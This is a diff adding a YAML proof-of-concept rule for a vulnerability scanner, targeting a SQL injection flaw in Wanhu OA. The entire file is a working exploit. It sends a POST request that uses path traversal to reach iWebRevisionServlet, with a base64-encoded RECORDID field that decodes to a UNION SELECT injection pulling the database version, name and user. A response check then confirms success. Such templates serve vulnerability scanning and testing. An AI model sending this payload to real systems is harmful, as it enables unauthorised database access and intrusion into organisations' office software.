@@ -1,0 +1,15 @@
+name: wanhu-sqli
+rules:
+  - method: POST
+    path: "/defaultroot/iWebOfficeSign/OfficeServer.jsp/../../iWebRevisionServlet"
+    headers:
+      Content-Type: application/octet-stream
+      X-Requested-With: XMLHttpRequest
+    body: "DBSTEP V3.0     148              0                0             DBSTEP=REJTVEVQ OPTION=U0hPV0hJU1RPUlk= RECORDID=MCcgdW5pb24gc2VsZWN0IEBAdmVyc2lvbixkYl9uYW1lKCksMSwxLHVzZXItLSA= FIELDNAME=MQ== USERNAME=MQ=="
+    expression: |
+      response.status == 200 && response.body.bcontains(b"DBSTEP V3.0")
+detail:
+  author: lxy
+  links:
+    - https://github.com/PeiQi0/PeiQi-WIKI-Book
+  description: "万户OA SQL注入漏洞"
